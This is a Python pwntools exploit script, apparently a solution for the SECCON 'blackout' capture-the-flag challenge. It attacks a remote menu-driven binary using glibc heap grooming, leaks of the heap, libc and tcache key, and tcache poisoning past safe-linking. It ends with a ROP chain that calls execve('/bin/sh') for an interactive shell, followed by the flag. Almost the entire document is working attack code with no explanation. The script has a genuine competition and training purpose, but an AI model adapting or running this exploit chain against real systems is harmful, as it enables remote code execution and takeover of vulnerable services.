from pwn import *
from tqdm import tqdm
import os

context.update(arch="amd64")

#s = remote("jammy", 1337)
s = remote("blackout.seccon.games", 9999)

def add(index, size, data=b""):
    s.sendline(b"1")
    s.sendline(str(index).encode())
    s.sendline(str(size).encode())
    if size:
        s.sendline(data)

def blackout(index, word=None):
    s.sendline(b"2")
    s.sendline(str(index).encode())
    if word is None:
        word = os.urandom(15).hex().encode()
    s.sendline(word)
    s.recvuntil(b"[Redacted]\n")
    return s.recvuntil(b"\n> ", drop=True)

def delete(index):
    s.sendline(b"3")
    s.sendline(str(index).encode())

def make_overwriter():
    # make a chunk that lets us overwrite memory near the initial av->top (OVERWRITER_BASE)
    for i in tqdm(range(65535)):
        add(7, 0xffef, b"")
        if i % 2048 == 0:
            s.clean()
    add(7, 0x7800)
    add(7, 0xffef)
    s.clean()

def overwrite(offset, size=1):
    global OVERWRITER_BASE
    assert size < 31
    # overwrite <offset> relative to the overwriter's base with a 0x2a byte
    delete(7)
    add(7, 0xffef, b"a" * (offset - OVERWRITER_BASE + 34800) + b"b" * size)
    blackout(7, b"b" * size)

add(0, 16)
add(1, 16)
delete(1)
delete(0)
for i in range(8):
    add(i, 32)
    add(i, 256)
for i in reversed(range(8)):
    delete(i)
add(0, 0)

OVERWRITER_BASE = 0xce0
make_overwriter()

overwrite(0x2a0, 16)
overwrite(0x2b0, 16)
leak = blackout(0)
# leak PROTECT_PTR(next)
heapbase = u64(leak[32:].ljust(8, b"\0")) << 12
log.info("heapbase: 0x%x", heapbase)

# prep some chunks for the tcache overwrite later
cur_top = OVERWRITER_BASE + heapbase + (1 << 32) + 0x7810
add(6, 0xffef - cur_top % 0x10000)
add(6, 0x1de0)
add(6, 0x300)
add(6, 0x300)
add(5, 0x200)
add(4, 0x200)
delete(4)
delete(5)
add(3, 0x350)
delete(3)
new_top_base = cur_top + 0x10000 - cur_top % 0x10000

# leak tcache key
overwrite(0x2c0, 8)
leak = blackout(0)
tcache_key = leak[40:48]
log.info("tache key: %s", tcache_key.hex())

# leak libc
for i in range(0x2c0, 0x310, 16):
    overwrite(i, 16)

leak = blackout(0)
libc_base = u64(leak[0x310 - 0x2a0:].ljust(8, b"\0")) - 0x219de0
log.info("libc base: 0x%x", libc_base)

# tcache hacking
environ_ptr = libc_base + 0x221200
log.info("new top base: 0x%x", new_top_base)
overwrite(0x189, 1) # 0x2410 -> 0x2a10
victim = 0x404060
next_ptr = ((new_top_base + 0x2410) >> 12) ^ victim
add(3, 0x350, b"a" * (0x2a00 - 0x2830) + p64(0) + p64(0x211) + p64(next_ptr) + tcache_key)
add(4, 0x200)
add(5, 0x200, flat([
    environ_ptr, 0, 0, new_top_base + 0x2830,
    new_top_base + 0x1df0, new_top_base + 0x2100, 0, cur_top - 0x10000
]))
leak = blackout(0)
environ = u64(leak.ljust(8, b"\0"))
log.info("environ: 0x%x", environ)

# tcache hacking again
pause()
delete(4)
delete(5)
delete(3)
overwrite(0x209, 1) # 0x2400 -> 0x2a00
victim = (environ - 0x138) & ~0xf
next_ptr = ((new_top_base + 0x2400) >> 12) ^ victim
add(3, 0x350, b"a" * (0x29f0 - 0x2830) + p64(0) + p64(0x211) + p64(next_ptr) + tcache_key)
add(4, 0x300)

# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('Q', x)

rebase_0 = lambda x : p(x + libc_base)

rop = b''

rop += rebase_0(0x0000000000041c4a) # 0x0000000000041c4a: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x0000000000035dd1) # 0x0000000000035dd1: pop rbx; ret; 
rop += rebase_0(0x00000000002191e0)
rop += rebase_0(0x000000000005f962) # 0x000000000005f962: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000041c4a) # 0x0000000000041c4a: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000035dd1) # 0x0000000000035dd1: pop rbx; ret; 
rop += rebase_0(0x00000000002191e8)
rop += rebase_0(0x000000000005f962) # 0x000000000005f962: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000002a3e5) # 0x000000000002a3e5: pop rdi; ret; 
rop += rebase_0(0x00000000002191e0)
rop += rebase_0(0x000000000002be51) # 0x000000000002be51: pop rsi; ret; 
rop += rebase_0(0x00000000002191e8)
rop += rebase_0(0x000000000011f497) # 0x000000000011f497: pop rdx; pop r12; ret; 
rop += rebase_0(0x00000000002191e8)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000045eb0) # 0x0000000000045eb0: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000091396) # 0x0000000000091396: syscall; ret; 

# pad with ret
add(5, 0x300, rebase_0(0x29f3b) * ((0x2f0 - len(rop)) // 8) + rop)

s.interactive()

# SECCON{D0n't_f0Rg3T_fuNcT10n_d3cL4r4T10n}
